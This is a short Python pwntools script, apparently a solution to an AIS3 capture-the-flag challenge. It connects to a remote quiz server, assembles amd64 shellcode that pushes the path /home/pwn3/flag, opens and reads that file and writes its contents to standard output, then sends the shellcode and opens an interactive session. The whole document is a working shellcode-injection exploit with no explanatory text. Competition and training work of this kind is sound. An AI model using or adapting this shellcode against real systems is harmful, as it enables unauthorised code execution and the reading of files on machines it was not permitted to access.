
from pwn import *

context.update(os='linux', arch='amd64')

r = remote('quiz.ais3.org', 9563)

s = ''
s += shellcraft.pushstr('/home/pwn3/flag')
s += shellcraft.open('rsp', constants.O_RDONLY, 0)
s += shellcraft.mov('r12', 'rax')
s += 'here:'
s += shellcraft.read('r12', 'rsp', 41)
s += shellcraft.write(1, 'rsp', 'rax')
s += 'jmp here'

r.sendline(asm(s))

r.interactive()

